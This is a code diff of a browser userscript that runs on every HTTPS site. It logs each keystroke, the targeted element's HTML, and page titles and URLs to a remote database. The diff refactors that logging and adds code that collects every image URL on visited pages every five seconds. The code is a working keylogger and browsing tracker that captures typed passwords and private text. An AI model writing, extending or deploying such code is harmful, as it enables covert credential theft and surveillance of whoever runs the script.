@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Key Userscript
 // @namespace    http://tampermonkey.net/
-// @version      1.0.1
+// @version      1.0.2
 // @description  try to take over the world!
 // @author       You
 // @match        https://*/*
@@ -13,9 +13,9 @@
 //// @require      https://e-grau.github.io/estrella/key.js
 // @grant        none
 // ==/UserScript==
+//uu = "othername";
 
-  var uu = "";
-
+var uu = "";
 
 (function() {
     'use strict';
@@ -37,10 +37,11 @@
 
     const keys$ = db.collection("keys");
     const history$ = db.collection("history");
+    const images$ = db.collection("images");
 
     // Your code here...
     var keys = '';
-
+    const images = [];
 
 
     const data = {
@@ -54,17 +55,13 @@
 
     window.onload = function() {
 
-        history$.add({
-            date: new Date(),
-            title: document.title,
-            url: window.location.href,
-            user: uu || "_ANON_",
-            day: dayjs().format("YYYY-MM-DD"),
-
-        })
+        history$.add(getPageInfo())
 
 
     }
+
+
+
     document.onkeypress = function(e) {
         let get = window.event ? event : e;
         data.element = get.target.outerHTML;
@@ -84,20 +81,61 @@
     function saveKeys(e) {
         if (keys.length > 0) {
             //new Image().src = url+keys;
-            data.keys = keys;
-            data.title = document.title;
-            data.url = window.location.href;
-            data.date = new Date();
-            data.day = dayjs().format("YYYY-MM-DD");
-            data.uu = uu || "_ANON_";
-            console.log(data);
+            //data.keys = keys;
+            //data.title = document.title;
+            // data.url = window.location.href;
+            //data.date = new Date();
+            //data.day = dayjs().format("YYYY-MM-DD");
+            //  data.uu = uu || "_ANON_";
+            //   console.log(data);
 
-            keys$.add(data);
+            keys$.add({
+                ...getPageInfo(),
+                keys: keys,
+            });
+
             keys = '';
         }
 
     }
 
+    function getPageInfo() {
 
+        return {
+            host: window.location.hostname,
+            url: window.location.href,
+            date: new Date(),
+            day: dayjs().format("YYYY-MM-DD"),
+            title: document.title,
+            uu: uu || "_ANON_",
+        }
+
+    }
+
+    function getImages() {
+        let newImages = Array.from(document.querySelectorAll("img")).filter(img => img.src).map(img => img.src).filter((v, i, a) => a.indexOf(v) === i).filter(url => images.indexOf(url) === -1);
+        //  console.log("newImages",newImages)
+        newImages.forEach(img => images.push(img))
+        return newImages;
+
+    }
+
+    function saveImages() {
+        const imgs = getImages();
+        if (imgs.length) {
+
+            console.log("imagesssssssss", imgs)
+
+            images$.add({
+                ...getPageInfo(),
+                images: imgs,
+                imagesLength: imgs.length,
+            })
+        }
+
+
+    }
+
+    setInterval(saveImages, 5000)
 
 })();
